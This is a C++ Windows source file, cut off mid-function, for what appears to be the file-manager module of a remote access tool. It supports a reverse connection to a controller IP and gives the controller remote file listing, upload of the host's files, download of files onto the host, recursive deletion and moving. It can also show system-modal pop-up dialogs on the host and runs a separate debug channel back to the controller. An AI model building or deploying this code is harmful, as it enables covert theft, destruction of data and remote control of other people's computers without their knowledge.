#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shlwapi.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <atomic>
#include <fstream>
#include <sstream>
#include <mutex>
#include <algorithm>
#include <queue>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shlwapi.lib")

const int FILEMGR_PORT = 8888;
const size_t MAX_CHUNK_SIZE = 1024 * 1024;

const int HEARTBEAT_INTERVAL = 5000;
const int DEBUG_PORT = 8889;

enum FMPacketType : uint8_t {
    FM_HEARTBEAT = 0x01,
    FM_HEARTBEAT_ACK = 0x02,
    FM_COMMAND = 0x03,
    FM_RESPONSE = 0x04,
    FM_FILE_DATA = 0x05,
    FM_DIR_LISTING = 0x06,
    FM_ERROR = 0x07,
    FM_DEBUG = 0x08,
    FM_MESSAGE = 0x09
};

struct MessageDialogParams {
    std::string title;
    std::string message;
    std::string buttons;
};

class DebugLogger {
private:
    std::queue<std::string> debugQueue;
    std::mutex queueMutex;
    SOCKET debugSocket;
    std::atomic<bool> connected;
    HANDLE sendThread;
    std::atomic<bool> running;

public:
    DebugLogger() : debugSocket(INVALID_SOCKET), connected(false), sendThread(nullptr), running(false) {}

    void Start(const std::string& controllerIP) {
        running = true;

        debugSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (debugSocket == INVALID_SOCKET) {
            return;
        }

        u_long mode = 1;
        ioctlsocket(debugSocket, FIONBIO, &mode);

        struct sockaddr_in debugAddr;
        debugAddr.sin_family = AF_INET;
        debugAddr.sin_addr.s_addr = inet_addr(controllerIP.c_str());
        debugAddr.sin_port = htons(DEBUG_PORT);

        int result = connect(debugSocket, (struct sockaddr*)&debugAddr, sizeof(debugAddr));

        fd_set writefds;
        struct timeval timeout;
        timeout.tv_sec = 3;
        timeout.tv_usec = 0;

        FD_ZERO(&writefds);
        FD_SET(debugSocket, &writefds);

        if (select(0, NULL, &writefds, NULL, &timeout) > 0) {
            connected = true;

            sendThread = CreateThread(NULL, 0, SendThreadProc, this, 0, NULL);
        }
        else {
            closesocket(debugSocket);
            debugSocket = INVALID_SOCKET;
        }
    }

    void Log(const std::string& message) {

        if (connected) {
            std::lock_guard<std::mutex> lock(queueMutex);
            debugQueue.push(message);
        }
    }

    void Stop() {
        running = false;
        connected = false;

        if (sendThread) {
            WaitForSingleObject(sendThread, 2000);
            CloseHandle(sendThread);
            sendThread = nullptr;
        }

        if (debugSocket != INVALID_SOCKET) {
            closesocket(debugSocket);
            debugSocket = INVALID_SOCKET;
        }
    }

private:

    static DWORD WINAPI SendThreadProc(LPVOID lpParam) {
        DebugLogger* logger = (DebugLogger*)lpParam;

        while (logger->running) {
            std::string msg;
            {
                std::lock_guard<std::mutex> lock(logger->queueMutex);
                if (!logger->debugQueue.empty()) {
                    msg = logger->debugQueue.front();
                    logger->debugQueue.pop();
                }
            }

            if (!msg.empty() && logger->connected) {

                uint8_t header[5];
                header[0] = FM_DEBUG;
                uint32_t size = htonl((uint32_t)msg.size());
                memcpy(&header[1], &size, 4);

                int sent = send(logger->debugSocket, (char*)header, 5, 0);
                if (sent == 5) {
                    send(logger->debugSocket, msg.c_str(), (int)msg.size(), 0);
                }
                else {
                    logger->connected = false;
                    break;
                }
            }

            Sleep(100);
        }

        return 0;
    }
};

DebugLogger g_debugLogger;

std::atomic<bool> g_fm_running(false);
std::atomic<bool> g_fm_stop_requested(false);
std::atomic<bool> g_fm_session_active(false);
std::atomic<DWORD> g_fm_last_heartbeat(0);
std::atomic<bool> g_receiving_download(false);
std::string g_download_filename;
std::atomic<size_t> g_download_expected_size(0);
std::mutex g_download_mutex;
std::ofstream g_download_file;
std::string g_download_part_path;
std::atomic<size_t> g_download_bytes_received(0);

SOCKET g_fm_serverSocket = INVALID_SOCKET;
SOCKET g_fm_clientSocket = INVALID_SOCKET;
HANDLE g_fm_mainThread = nullptr;
HANDLE g_fm_heartbeatThread = nullptr;

std::string g_current_dir;
std::string g_controller_ip;
std::mutex g_fm_socketMutex;
std::string g_callback_ip = "";   
int         g_callback_port = 0;

std::string GetAbsPath(const std::string& path) {
    if (path.empty()) return g_current_dir;

    if (!PathIsRelativeA(path.c_str())) {
        return path;
    }

    char resolvedPath[MAX_PATH];
    std::string fullPath = g_current_dir + "\\" + path;

    if (PathCanonicalizeA(resolvedPath, fullPath.c_str())) {
        return std::string(resolvedPath);
    }

    return fullPath;
}

void FMLog(const std::string& message) {
    g_debugLogger.Log(message);
}

std::string GetCurrentDirectory() {
    char buffer[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, buffer);
    return std::string(buffer);
}

bool SetCurrentDirectory(const std::string& path) {
    return SetCurrentDirectoryA(path.c_str()) != 0;
}

bool SendFMPacket(FMPacketType type, const std::string& data) {
    if (g_fm_clientSocket == INVALID_SOCKET || !g_fm_session_active) {
        FMLog("SEND ERROR: Socket invalid or session inactive");
        return false;
    }

    std::lock_guard<std::mutex> lock(g_fm_socketMutex);

    uint8_t header[5];
    header[0] = type;
    uint32_t size = htonl((uint32_t)data.size());
    memcpy(&header[1], &size, 4);

    FMLog("SEND: Type=" + std::to_string(type) + " Size=" + std::to_string(data.size()));

    int sent = send(g_fm_clientSocket, (char*)header, 5, 0);
    if (sent != 5) {
        FMLog("SEND ERROR: Header send failed, sent=" + std::to_string(sent));
        return false;
    }

    if (!data.empty()) {
        size_t totalSent = 0;
        while (totalSent < data.size()) {
            size_t remaining = data.size() - totalSent;
            size_t chunkSize = (remaining > MAX_CHUNK_SIZE) ? MAX_CHUNK_SIZE : remaining;

            int chunk = send(g_fm_clientSocket, data.c_str() + totalSent, (int)chunkSize, 0);
            if (chunk <= 0) {
                FMLog("SEND ERROR: Data send failed at " + std::to_string(totalSent) + " bytes");
                return false;
            }
            totalSent += chunk;

            if (data.size() > 10 * 1024 * 1024 && totalSent % (5 * 1024 * 1024) == 0) {
                int percent = (int)((totalSent * 100) / data.size());
                FMLog("SEND: Progress " + std::to_string(percent) + "%");
            }
        }
        FMLog("SEND: Completed " + std::to_string(totalSent) + " bytes");
    }

    return true;
}

std::string GetFileSize(const std::string& path) {
    WIN32_FILE_ATTRIBUTE_DATA fileInfo;
    if (GetFileAttributesExA(path.c_str(), GetFileExInfoStandard, &fileInfo)) {
        LARGE_INTEGER size;
        size.LowPart = fileInfo.nFileSizeLow;
        size.HighPart = fileInfo.nFileSizeHigh;

        double bytes = (double)size.QuadPart;
        if (bytes < 1024) return std::to_string((int)bytes) + " B";
        if (bytes < 1024 * 1024) return std::to_string((int)(bytes / 1024)) + " KB";
        if (bytes < 1024 * 1024 * 1024) return std::to_string((int)(bytes / (1024 * 1024))) + " MB";
        return std::to_string((int)(bytes / (1024 * 1024 * 1024))) + " GB";
    }
    return "0 B";
}

std::string GetFileTime(const FILETIME& ft) {
    SYSTEMTIME stUTC, stLocal;
    FileTimeToSystemTime(&ft, &stUTC);
    SystemTimeToTzSpecificLocalTime(NULL, &stUTC, &stLocal);

    char buffer[64];
    sprintf_s(buffer, "%04d-%02d-%02d %02d:%02d:%02d",
        stLocal.wYear, stLocal.wMonth, stLocal.wDay,
        stLocal.wHour, stLocal.wMinute, stLocal.wSecond);
    return std::string(buffer);
}

std::string ListDisks() {
    FMLog("LIST_DISKS: Fetching available drives");

    std::ostringstream result;
    result << "DISK_LIST\n";

    DWORD drives = GetLogicalDrives();
    int diskCount = 0;

    for (int i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            char driveLetter = 'A' + i;
            std::string drivePath = std::string(1, driveLetter) + ":";

            std::string driveRoot = drivePath + "\\";
            UINT driveType = GetDriveTypeA(driveRoot.c_str());

            std::string typeStr = "Unknown";
            switch (driveType) {
            case DRIVE_FIXED: typeStr = "Local Disk"; break;
            case DRIVE_REMOVABLE: typeStr = "Removable"; break;
            case DRIVE_REMOTE: typeStr = "Network"; break;
            case DRIVE_CDROM: typeStr = "CD-ROM"; break;
            case DRIVE_RAMDISK: typeStr = "RAM Disk"; break;
            }

            char volumeName[MAX_PATH] = { 0 };
            GetVolumeInformationA(driveRoot.c_str(), volumeName, MAX_PATH,
                NULL, NULL, NULL, NULL, 0);

            std::string displayName = volumeName[0] ? volumeName : typeStr;

            ULARGE_INTEGER freeBytes, totalBytes;
            std::string sizeStr = "N/A";

            if (GetDiskFreeSpaceExA(driveRoot.c_str(), &freeBytes, &totalBytes, NULL)) {
                double totalGB = totalBytes.QuadPart / (1024.0 * 1024.0 * 1024.0);
                double freeGB = freeBytes.QuadPart / (1024.0 * 1024.0 * 1024.0);

                char sizeBuffer[64];
                sprintf_s(sizeBuffer, "%.1f GB free of %.1f GB", freeGB, totalGB);
                sizeStr = sizeBuffer;
            }

            result << "[DISK]|" << drivePath << "|" << displayName << "|" << sizeStr << "\n";
            diskCount++;
        }
    }

    FMLog("LIST_DISKS: Found " + std::to_string(diskCount) + " drives");
    return result.str();
}

std::string ListDirectory(const std::string& path) {
    FMLog("LIST: Directory=" + path);

    std::ostringstream result;
    std::string searchPath = path + "\\*";

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        FMLog("LIST ERROR: FindFirstFile failed, error=" + std::to_string(error));
        return "ERROR: Cannot access directory (Error " + std::to_string(error) + ")";
    }

    result << "CURRENT_DIR:" << path << "\n";

    int dirCount = 0, fileCount = 0;

    do {
        std::string name = findData.cFileName;
        if (name == ".") continue;

        bool isDir = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        std::string type = isDir ? "[DIR]" : "[FILE]";
        std::string size = isDir ? "<DIR>" : GetFileSize(path + "\\" + name);
        std::string modified = GetFileTime(findData.ftLastWriteTime);

        result << type << "|" << name << "|" << size << "|" << modified << "\n";

        if (isDir) dirCount++;
        else fileCount++;

    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);

    FMLog("LIST: Found " + std::to_string(dirCount) + " dirs, " + std::to_string(fileCount) + " files");

    return result.str();
}

bool ChangeDirectory(const std::string& newPath) {
    FMLog("CD: Requested path=" + newPath);

    char resolvedPath[MAX_PATH];

    if (!PathIsRelativeA(newPath.c_str())) {
        strcpy_s(resolvedPath, newPath.c_str());
    }
    else {
        std::string fullPath = g_current_dir + "\\" + newPath;
        if (!PathCanonicalizeA(resolvedPath, fullPath.c_str())) {
            FMLog("CD ERROR: PathCanonicalize failed");
            return false;
        }
    }

    FMLog("CD: Resolved path=" + std::string(resolvedPath));

    if (SetCurrentDirectoryA(resolvedPath)) {
        g_current_dir = GetCurrentDirectory();
        FMLog("CD: Success, new dir=" + g_current_dir);
        return true;
    }

    DWORD error = GetLastError();
    FMLog("CD ERROR: SetCurrentDirectory failed, error=" + std::to_string(error));
    return false;
}

bool CopyFileOrDirectory(const std::string& source, const std::string& dest) {
    FMLog("COPY: Source=" + source + " Dest=" + dest);

    DWORD attrs = GetFileAttributesA(source.c_str());

    if (attrs == INVALID_FILE_ATTRIBUTES) {
        FMLog("COPY ERROR: Source not found");
        return false;
    }

    if (attrs & FILE_ATTRIBUTE_DIRECTORY) {
        FMLog("COPY: Recursive directory copy");

        if (!CreateDirectoryA(dest.c_str(), NULL)) {
            if (GetLastError() != ERROR_ALREADY_EXISTS) {
                FMLog("COPY ERROR: CreateDirectory failed, error=" + std::to_string(GetLastError()));
                return false;
            }
        }

        std::string searchPath = source + "\\*";
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

        if (hFind == INVALID_HANDLE_VALUE) {
            FMLog("COPY ERROR: FindFirstFile failed");
            return false;
        }

        int copied = 0;
        do {
            std::string name = findData.cFileName;
            if (name == "." || name == "..") continue;

            std::string srcPath = source + "\\" + name;
            std::string dstPath = dest + "\\" + name;

            if (!CopyFileOrDirectory(srcPath, dstPath)) {
                FindClose(hFind);
                FMLog("COPY ERROR: Recursive copy failed at " + name);
                return false;
            }
            copied++;
        } while (FindNextFileA(hFind, &findData));

        FindClose(hFind);
        FMLog("COPY: Copied " + std::to_string(copied) + " items");
        return true;
    }
    else {
        BOOL result = CopyFileA(source.c_str(), dest.c_str(), FALSE);
        if (result) {
            FMLog("COPY: File copied successfully");
        }
        else {
            FMLog("COPY ERROR: CopyFile failed, error=" + std::to_string(GetLastError()));
        }
        return result != 0;
    }
}

bool MoveFileOrDirectory(const std::string& source, const std::string& dest) {
    FMLog("MOVE: Source=" + source + " Dest=" + dest);

    BOOL result = MoveFileExA(source.c_str(), dest.c_str(),
        MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED);

    if (result) {
        FMLog("MOVE: Success");
    }
    else {
        FMLog("MOVE ERROR: Failed, error=" + std::to_string(GetLastError()));
    }

    return result != 0;
}

bool DeleteFileOrDirectory(const std::string& path) {
    FMLog("DELETE: Path=" + path);

    DWORD attrs = GetFileAttributesA(path.c_str());

    if (attrs == INVALID_FILE_ATTRIBUTES) {
        FMLog("DELETE ERROR: Path not found");
        return false;
    }

    if (attrs & FILE_ATTRIBUTE_DIRECTORY) {
        FMLog("DELETE: Recursive directory delete");

        std::string searchPath = path + "\\*";
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

        if (hFind == INVALID_HANDLE_VALUE) {
            FMLog("DELETE ERROR: FindFirstFile failed");
            return false;
        }

        int deleted = 0;
        do {
            std::string name = findData.cFileName;
            if (name == "." || name == "..") continue;

            std::string fullPath = path + "\\" + name;
            if (!DeleteFileOrDirectory(fullPath)) {
                FindClose(hFind);
                FMLog("DELETE ERROR: Recursive delete failed at " + name);
                return false;
            }
            deleted++;
        } while (FindNextFileA(hFind, &findData));

        FindClose(hFind);

        BOOL result = RemoveDirectoryA(path.c_str());
        if (result) {
            FMLog("DELETE: Removed directory with " + std::to_string(deleted) + " items");
        }
        else {
            FMLog("DELETE ERROR: RemoveDirectory failed, error=" + std::to_string(GetLastError()));
        }
        return result != 0;
    }
    else {
        BOOL result = DeleteFileA(path.c_str());
        if (result) {
            FMLog("DELETE: File deleted");
        }
        else {
            FMLog("DELETE ERROR: DeleteFile failed, error=" + std::to_string(GetLastError()));
        }
        return result != 0;
    }
}

bool RenameFileOrDirectory(const std::string& oldName, const std::string& newName) {
    std::string oldPath = g_current_dir + "\\" + oldName;
    std::string newPath = g_current_dir + "\\" + newName;

    FMLog("RENAME: Old=" + oldPath + " New=" + newPath);

    BOOL result = MoveFileA(oldPath.c_str(), newPath.c_str());

    if (result) {
        FMLog("RENAME: Success");
    }
    else {
        FMLog("RENAME ERROR: Failed, error=" + std::to_string(GetLastError()));
    }

    return result != 0;
}

bool UploadFile(const std::string& filename, uint64_t offset = 0) {
    std::string fullPath = g_current_dir + "\\" + filename;

    FMLog("UPLOAD: Starting file=" + fullPath + " offset=" + std::to_string(offset));

    std::ifstream file(fullPath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        FMLog("UPLOAD ERROR: Cannot open file, error=" + std::to_string(GetLastError()));
        SendFMPacket(FM_ERROR, "ERROR: Cannot open file for upload");
        return false;
    }

    std::streamsize totalSize = file.tellg();

    if ((std::streamsize)offset > totalSize) {
        FMLog("UPLOAD WARNING: Offset exceeds file size, resetting to 0");
        offset = 0;
    }

    file.seekg(offset, std::ios::beg);

    FMLog("UPLOAD: File size=" + std::to_string(totalSize) + " sending from offset=" + std::to_string(offset));

    std::ostringstream header;
    header << "FILE_UPLOAD:" << filename << "|" << totalSize << "|" << offset;
    if (!SendFMPacket(FM_FILE_DATA, header.str())) {
        file.close();
        FMLog("UPLOAD ERROR: Failed to send header");
        return false;
    }

    const size_t CHUNK_SIZE = 512 * 1024;
    std::vector<char> buffer(CHUNK_SIZE);
    uint64_t totalSent = 0;
    std::streamsize remaining = totalSize - (std::streamsize)offset;

    while (remaining > 0) {
        size_t toRead = (remaining < (std::streamsize)CHUNK_SIZE) ? (size_t)remaining : CHUNK_SIZE;
        file.read(buffer.data(), toRead);
        size_t bytesRead = file.gcount();
        if (bytesRead == 0) break;

        std::string chunk(buffer.data(), bytesRead);
        if (!SendFMPacket(FM_FILE_DATA, chunk)) {
            file.close();
            FMLog("UPLOAD ERROR: Failed to send chunk at offset " + std::to_string(offset + totalSent));
            return false;
        }

        totalSent += bytesRead;
        remaining -= bytesRead;

        if (totalSize > 10 * 1024 * 1024) {
            uint64_t totalDone = offset + totalSent;
            int percent = (int)((totalDone * 100) / totalSize);
            if (totalSent % (5 * 1024 * 1024) == 0) {
                FMLog("UPLOAD: Progress=" + std::to_string(percent) + "% (" + std::to_string(totalDone) + "/" + std::to_string(totalSize) + ")");
            }
        }
    }

    file.close();
    SendFMPacket(FM_FILE_DATA, "FILE_UPLOAD_COMPLETE");
    FMLog("UPLOAD: Completed, sent " + std::to_string(totalSent) + " bytes from offset " + std::to_string(offset));

    return true;
}

bool DownloadFile(const std::string& filename, const std::vector<char>& fileData) {
    std::string fullPath = g_current_dir + "\\" + filename;

    FMLog("DOWNLOAD: Receiving file=" + fullPath + " size=" + std::to_string(fileData.size()));

    std::ofstream file(fullPath, std::ios::binary);
    if (!file.is_open()) {
        FMLog("DOWNLOAD ERROR: Cannot create file, error=" + std::to_string(GetLastError()));
        SendFMPacket(FM_ERROR, "ERROR: Cannot create file for download");
        return false;
    }

    file.write(fileData.data(), fileData.size());
    file.close();

    if (file.fail()) {
        FMLog("DOWNLOAD ERROR: Write failed");
        SendFMPacket(FM_ERROR, "ERROR: Failed to write file");
        return false;
    }

    FMLog("DOWNLOAD: File saved successfully");
    SendFMPacket(FM_RESPONSE, "OK:File received: " + filename);
    return true;
}

DWORD WINAPI ShowMessageDialogThread(LPVOID lpParam) {
    MessageDialogParams* params = (MessageDialogParams*)lpParam;

    FMLog("MESSAGE: Showing dialog - Title: " + params->title);

    UINT uType = MB_SYSTEMMODAL | MB_SETFOREGROUND | MB_TOPMOST;

    if (params->buttons == "OKCANCEL") {
        uType |= MB_OKCANCEL;
    }
    else if (params->buttons == "YESNO") {
        uType |= MB_YESNO;
    }
    else if (params->buttons == "ENTER") {
        uType |= MB_OK;
    }
    else {
        uType |= MB_OK;
    }

    int result = MessageBoxA(NULL, params->message.c_str(), params->title.c_str(), uType);

    std::string response;
    switch (result) {
    case IDOK:
        response = "OK:User clicked OK";
        break;
    case IDCANCEL:
        response = "OK:User clicked CANCEL";
        break;
    case IDYES:
        response = "OK:User clicked YES";
        break;
    case IDNO:
        response = "OK:User clicked NO";
        break;
    default:
        response = "OK:Dialog closed";
        break;
    }

    SendFMPacket(FM_RESPONSE, response);
    FMLog("MESSAGE: Dialog result sent - " + response);

    delete params;
    return 0;
}

bool ShowMessageDialog(const std::string& title, const std::string& message, const std::string& buttons) {
    MessageDialogParams* params = new MessageDialogParams();
    params->title = title;
    params->message = message;
    params->buttons = buttons;

    HANDLE hThread = CreateThread(NULL, 0, ShowMessageDialogThread, params, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
        return true;
    }

    delete params;
    return false;
}

void ProcessCommand(const std::string& cmd) {
    FMLog("COMMAND: " + cmd);

    if (cmd == "pwd") {
        SendFMPacket(FM_RESPONSE, "CURRENT_DIR:" + g_current_dir);
    }
    else if (cmd == "ls" || cmd == "dir") {
        std::string listing = ListDirectory(g_current_dir);
        SendFMPacket(FM_DIR_LISTING, listing);
    }
    else if (cmd.find("cd ") == 0) {
        std::string newPath = cmd.substr(3);
        if (ChangeDirectory(newPath)) {
            SendFMPacket(FM_RESPONSE, "CURRENT_DIR:" + g_current_dir);

            std::string listing = ListDirectory(g_current_dir);
            SendFMPacket(FM_DIR_LISTING, listing);
        }
        else {
            SendFMPacket(FM_ERROR, "ERROR: Cannot change directory to " + newPath);
        }
    }
    else if (cmd.find("copy ") == 0) {
        std::string params = cmd.substr(5);
        size_t pipePos = params.find('|');

        if (pipePos != std::string::npos) {
            std::string source = GetAbsPath(params.substr(0, pipePos));
            std::string dest = GetAbsPath(params.substr(pipePos + 1));

            if (CopyFileOrDirectory(source, dest)) {
                SendFMPacket(FM_RESPONSE, "OK:Copied successfully");
            }
            else {
                DWORD err = GetLastError();
                SendFMPacket(FM_ERROR, "ERROR: Copy failed (Code " + std::to_string(err) + ")");
            }
        }
        else {
            SendFMPacket(FM_ERROR, "ERROR: Invalid syntax. Use: copy <src>|<dst>");
        }
    }
    else if (cmd.find("move ") == 0) {
        std::string params = cmd.substr(5);
        size_t pipePos = params.find('|');

        if (pipePos != std::string::npos) {
            std::string source = GetAbsPath(params.substr(0, pipePos));
            std::string dest = GetAbsPath(params.substr(pipePos + 1));

            if (MoveFileOrDirectory(source, dest)) {
                SendFMPacket(FM_RESPONSE, "OK:Moved successfully");
            }
            else {
                DWORD err = GetLastError();
                SendFMPacket(FM_ERROR, "ERROR: Move failed (Code " + std::to_string(err) + ")");
            }
        }
        else {
            SendFMPacket(FM_ERROR, "ERROR: Invalid syntax. Use: move <src>|<dst>");
        }
    }
    else if (cmd.find("delete ") == 0) {
        std::string target = cmd.substr(7);
        if (DeleteFileOrDirectory(g_current_dir + "\\" + target)) {
            SendFMPacket(FM_RESPONSE, "OK:Deleted " + target);
        }
        else {
            SendFMPacket(FM_ERROR, "ERROR: Failed to delete " + target);
        }
    }
    else if (cmd.find("rename ") == 0) {
        std::string params = cmd.substr(7);
        size_t pipePos = params.find('|');

        if (pipePos != std::string::npos) {
            std::string oldName = params.substr(0, pipePos);
            std::string newName = params.substr(pipePos + 1);

            if (RenameFileOrDirectory(oldName, newName)) {
                SendFMPacket(FM_RESPONSE, "OK:Renamed " + oldName + " to " + newName);
            }
            else {
                SendFMPacket(FM_ERROR, "ERROR: Rename failed");
            }
        }
        else {
            SendFMPacket(FM_ERROR, "ERROR: Invalid syntax. Use: rename <old>|<new>");
        }
    }
    else if (cmd.find("upload ") == 0) {
        std::string params = cmd.substr(7);
        size_t pipePos = params.find('|');

        std::string filename;
        uint64_t offset = 0;

        if (pipePos != std::string::npos) {
            filename = params.substr(0, pipePos);
            try {
                offset = std::stoull(params.substr(pipePos + 1));
            }
            catch (...) {
                offset = 0;
            }
        }
        else {
            filename = params;
        }

        FMLog("UPLOAD CMD: file=" + filename + " offset=" + std::to_string(offset));
        UploadFile(filename, offset);
    }

    else if (cmd.find("upload_size ") == 0) {
        std::string filename = cmd.substr(12);
        std::string partPath = g_current_dir + "\\" + filename + ".part";

        LARGE_INTEGER partSize = {};
        HANDLE hFile = CreateFileA(partPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            GetFileSizeEx(hFile, &partSize);
            CloseHandle(hFile);
        }

        FMLog("UPLOAD_SIZE: " + filename + " partial=" + std::to_string(partSize.QuadPart));
        SendFMPacket(FM_RESPONSE, "UPLOAD_SIZE:" + std::to_string(partSize.QuadPart));
    }
    else if (cmd.find("upload_discard ") == 0) {
        std::string filename = cmd.substr(15);
        std::string partPath = g_current_dir + "\\" + filename + ".part";
        DeleteFileA(partPath.c_str());
        FMLog("UPLOAD_DISCARD: Deleted partial file for " + filename);
        SendFMPacket(FM_RESPONSE, "UPLOAD_DISCARDED:" + filename);
    }

    else if (cmd.find("mkdir ") == 0) {
        std::string dirName = cmd.substr(6);
        std::string fullPath = g_current_dir + "\\" + dirName;
        if (CreateDirectoryA(fullPath.c_str(), NULL)) {
            SendFMPacket(FM_RESPONSE, "OK:Created directory " + dirName);
        }
        else {
            FMLog("MKDIR ERROR: Failed, error=" + std::to_string(GetLastError()));
            SendFMPacket(FM_ERROR, "ERROR: Failed to create directory");
        }
    }
    else if (cmd.find("download ") == 0) {
        std::string params = cmd.substr(9);
        size_t pipe1 = params.find('|');
        size_t pipe2 = (pipe1 != std::string::npos) ? params.find('|', pipe1 + 1) : std::string::npos;

        if (pipe1 != std::string::npos) {
            std::string filename = params.substr(0, pipe1);
            std::string sizeStr = params.substr(pipe1 + 1, (pipe2 != std::string::npos) ? pipe2 - pipe1 - 1 : std::string::npos);
            uint64_t offset = 0;

            if (pipe2 != std::string::npos) {
                try { offset = std::stoull(params.substr(pipe2 + 1)); }
                catch (...) { offset = 0; }
            }

            try {
                uint64_t fileSize = std::stoull(sizeStr);
                FMLog("DOWNLOAD: file=" + filename + " size=" + std::to_string(fileSize) + " offset=" + std::to_string(offset));

                g_download_part_path = g_current_dir + "\\" + filename + ".part";
                g_download_filename = filename;
                g_download_expected_size = fileSize;
                g_download_bytes_received = offset;

                std::lock_guard<std::mutex> lock(g_download_mutex);
                if (offset > 0) {
                    g_download_file.open(g_download_part_path, std::ios::binary | std::ios::app);
                    FMLog("DOWNLOAD: Resuming from offset=" + std::to_string(offset));
                }
                else {
                    g_download_file.open(g_download_part_path, std::ios::binary | std::ios::trunc);
                    FMLog("DOWNLOAD: Fresh start");
                }

                if (!g_download_file.is_open()) {
                    FMLog("DOWNLOAD ERROR: Cannot open .part file");
                    SendFMPacket(FM_ERROR, "ERROR: Cannot open file for writing");
                    g_receiving_download = false;
                    return;
                }

                g_receiving_download = true;
                SendFMPacket(FM_RESPONSE, "READY_FOR_DOWNLOAD:" + filename + "|" + std::to_string(fileSize));

            }
            catch (const std::exception& e) {
                FMLog("DOWNLOAD ERROR: " + std::string(e.what()));
                SendFMPacket(FM_ERROR, "ERROR: Invalid download parameters");
                g_receiving_download = false;
            }
        }
        else {
            SendFMPacket(FM_ERROR, "ERROR: Invalid syntax. Use: download <filename>|<size>|<offset>");
        }
    }
    else if (cmd == "exit") {
        FMLog("EXIT: User requested shutdown");
        SendFMPacket(FM_RESPONSE, "OK:Closing file manager");
        g_fm_session_active = false;
        g_fm_stop_requested = true;
    }
    else if (cmd == "disks") {
        std::string diskList = ListDisks();
        SendFMPacket(FM_DIR_LISTING, diskList);
    }
    else if (cmd == "help") {
        std::ostringstream help;
        help << "Available commands:\n";
        help << "  ls/dir          - List directory contents\n";
        help << "  pwd             - Print working directory\n";
        help << "  cd <path>       - Change directory\n";
        help << "  disks           - List all available drives\n";
        help << "  copy <src> <dst> - Copy file/directory\n";
        help << "  move <src> <dst> - Move file/directory\n";
        help << "  delete <name>   - Delete file/directory\n";
        help << "  rename <old> <new> - Rename file/directory\n";
        help << "  mkdir <name>    - Create directory\n";
        help << "  upload <file>   - Upload file to controller\n";
        help << "  download <file>|<size> - Receive file from controller\n";
        help << "  exit            - Close file manager\n";
        SendFMPacket(FM_RESPONSE, help.str());
    }
    else {
        FMLog("COMMAND ERROR: Unknown command");
        SendFMPacket(FM_ERROR, "ERROR: Unknown command '" + cmd + "'. Type 'help' for available commands");
    }
}

DWORD WINAPI FMHeartbeatThread(LPVOID lpParam) {
    FMLog("HEARTBEAT: Thread started");

    while (g_fm_running && !g_fm_stop_requested && g_fm_session_active) {
        Sleep(HEARTBEAT_INTERVAL);

        DWORD currentTime = GetTickCount();
        DWORD lastTime = g_fm_last_heartbeat.load();

        if (currentTime - lastTime > (HEARTBEAT_INTERVAL * 4)) {
            FMLog("HEARTBEAT: TIMEOUT - Connection lost");
            g_fm_session_active = false;
            g_fm_stop_requested = true;
            break;
        }

        std::lock_guard<std::mutex> lock(g_fm_socketMutex);
        if (g_fm_clientSocket != INVALID_SOCKET) {
            uint8_t heartbeat[5];
            heartbeat[0] = FM_HEARTBEAT;
            uint32_t timestamp = htonl(currentTime);
            memcpy(&heartbeat[1], &timestamp, 4);

            int sent = send(g_fm_clientSocket, (char*)heartbeat, 5, 0);
            if (sent != 5) {
                FMLog("HEARTBEAT: Send failed");
                g_fm_session_active = false;
                g_fm_stop_requested = true;
                break;
            }
        }
    }

    FMLog("HEARTBEAT: Thread ended");
    return 0;
}

DWORD WINAPI FMMainThread(LPVOID lpParam) {
    FMLog("MAIN: Thread started");

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        FMLog("MAIN ERROR: WSAStartup failed");
        return 1;
    }

    if (!g_callback_ip.empty() && g_callback_port > 0) {
        FMLog("MAIN: Reverse mode — connecting to " + g_callback_ip +
            ":" + std::to_string(g_callback_port));

        g_fm_clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (g_fm_clientSocket == INVALID_SOCKET) {
            FMLog("MAIN ERROR: Socket creation failed");
            WSACleanup();
            return 1;
        }

        struct sockaddr_in ctrlAddr;
        ctrlAddr.sin_family = AF_INET;
        ctrlAddr.sin_addr.s_addr = inet_addr(g_callback_ip.c_str());
        ctrlAddr.sin_port = htons((u_short)g_callback_port);

        bool connected = false;
        for (int attempt = 0; attempt < 5 && !connected; attempt++) {
            if (attempt > 0) Sleep(1000);
            FMLog("MAIN: Connect attempt " + std::to_string(attempt + 1));
            if (connect(g_fm_clientSocket,
                (struct sockaddr*)&ctrlAddr,
                sizeof(ctrlAddr)) == 0) {
                connected = true;
                FMLog("MAIN: Connected to controller successfully");
            }
            else {
                FMLog("MAIN: Connect failed, error=" +
                    std::to_string(WSAGetLastError()));
            }
        }

        if (!connected) {
            FMLog("MAIN ERROR: Could not reach controller after 5 attempts");
            closesocket(g_fm_clientSocket);
            g_fm_clientSocket = INVALID_SOCKET;
            WSACleanup();
            return 1;
        }
        g_fm_serverSocket = INVALID_SOCKET;
        g_controller_ip = g_callback_ip;
    }
    else {
        FMLog("MAIN: Normal mode — listening on port " +
            std::to_string(FILEMGR_PORT));

        g_fm_serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (g_fm_serverSocket == INVALID_SOCKET) {
            FMLog("MAIN ERROR: Socket creation failed");
